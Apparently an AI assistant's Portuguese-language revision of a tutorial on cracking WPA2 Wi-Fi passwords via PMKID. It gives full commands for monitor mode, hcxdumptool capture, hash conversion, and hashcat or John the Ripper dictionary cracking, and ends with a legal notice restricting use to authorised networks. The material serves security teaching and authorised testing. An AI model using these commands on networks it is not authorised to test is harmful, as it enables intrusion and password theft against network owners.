Claro, Raphael! Vamos revisar e aprimorar seu artigo sobre **crackeamento de redes Wi-Fi via PMKID**, mantendo o espírito didático e técnico, mas com refinamento estrutural, clareza conceitual e coesão prática. Segue abaixo a revisão com comentários de melhorias e sugestões de conteúdo adicional.

---

# 🔓 Crackeando Wi-Fi via PMKID

## 📌 Introdução

Tradicionalmente, os ataques a redes Wi-Fi envolvem a **captura e quebra do handshake WPA/WPA2**, mas esse método possui uma limitação crítica:

> 💡 **É necessário que algum dispositivo esteja conectado à rede** no momento do ataque para que o handshake possa ser capturado.

Por sorte (ou azar, dependendo do ponto de vista), existe uma técnica mais moderna: **o ataque via PMKID** — que permite capturar dados úteis **sem necessidade de clientes conectados** à rede.

---

## 🧠 Requisitos

Antes de seguir, é importante que você tenha:

* 📶 **Conhecimento básico sobre redes sem fio**
* 🐧 **Familiaridade com terminal no Linux**
* 💻 **Kali Linux (físico ou VM), com o pacote `aircrack-ng` já instalado**
* 🔌 **Placa de rede compatível com modo monitor e WPA2**

> ❗ Preferencialmente, utilize um adaptador USB com chipset compatível como o Atheros AR9271 (TL-WN722N v1, por exemplo).

---

## 🔍 O que é PMKID?

PMKID (Pairwise Master Key Identifier) é um identificador gerado durante a negociação de autenticação em redes WPA2.
Ao contrário do handshake clássico, ele pode ser coletado **sem a necessidade de um cliente ativo na rede**.

Isso o torna **extremamente útil para testes de segurança ofensiva**.

---

## ⚙️ Preparando o Ambiente

### 1. Instale os pacotes necessários:

```bash
sudo apt update
sudo apt install -y hcxdumptool hcxtools hashcat
```

Essas ferramentas serão usadas para:

* Capturar pacotes PMKID
* Converter para o formato correto
* Realizar a quebra da senha

---

## 📡 Ativando o Modo Monitor

Coloque sua interface de rede em modo monitor:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Substitua `wlan0` pelo nome da sua interface Wi-Fi.

---

## 📶 Capturando o PMKID

Use o `hcxdumptool` para iniciar a coleta dos pacotes PMKID:

```bash
sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
```

> O `--enable_status=1` mostra redes com `PMKID` capturado (indicadas por `+` na interface).

A captura será salva em `captura.pcapng`.

---

## 🔁 Convertendo a Captura para Hash

Agora converta o `.pcapng` para o formato de hash do Hashcat (`.22000`):

```bash
hcxpcapngtool -o rede.22000 captura.pcapng
```

---

## 🔓 Quebrando a Senha com Hashcat

Com o hash `.22000` em mãos e a wordlist certa (como a `rockyou.txt`), execute:

```bash
hashcat -m 22000 -a 0 rede.22000 /usr/share/wordlists/rockyou.txt --force
```

> **Explicação dos parâmetros:**
>
> * `-m 22000`: Tipo de hash (WPA-PMKID+EAPOL)
> * `-a 0`: Modo ataque por dicionário
> * `--force`: Ignora alertas do driver

Para ver a senha encontrada:

```bash
hashcat -m 22000 rede.22000 --show
```

---

## 💣 Alternativa: John the Ripper (modo Jumbo)

Também é possível usar o **John the Ripper** (compilado em modo Jumbo) para quebrar PMKIDs:

```bash
/usr/share/john/hcx2john.py rede.22000 > rede.john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk rede.john
john --show --format=wpapsk rede.john
```

> ⚙️ Se precisar compilar o John com suporte a WPA, veja as instruções em [https://github.com/openwall/john](https://github.com/openwall/john)

---

## 🧾 Explicando o que está acontecendo (Parte Didática)

* **hcxdumptool**: age como um sniffer ativo, forçando APs a enviarem o PMKID.
* **hcxpcapngtool**: converte os dados para formato entendido por ferramentas de força bruta.
* **hashcat/john**: tenta quebrar o hash usando dicionários de senhas.

---

## ✅ Melhoria de Terminologia e Prática

**Corrigir e padronizar os termos**:

* “Exploração” → Melhor usar **"Execução do ataque"** ou **"Fase de coleta"**
* “Crackeado” → Usar **"quebrado"**, **"decifrado"** ou **"descoberto"**
* Trocar **`arquivo BPF`** (confuso) por **“filtro de pacotes”**
* Revisar o uso de comandos desnecessários como `airmon-ng <interface>` na seção de scan (provavelmente quis usar `airodump-ng`)

---

## 🔐 Aviso Legal

> ⚠️ **Este conteúdo é estritamente educacional.**
>
> Realize testes apenas em redes autorizadas por você ou por contrato formal. A invasão ou interceptação de redes alheias **é crime previsto no Código Penal Brasileiro (Art. 154-A)**.

---
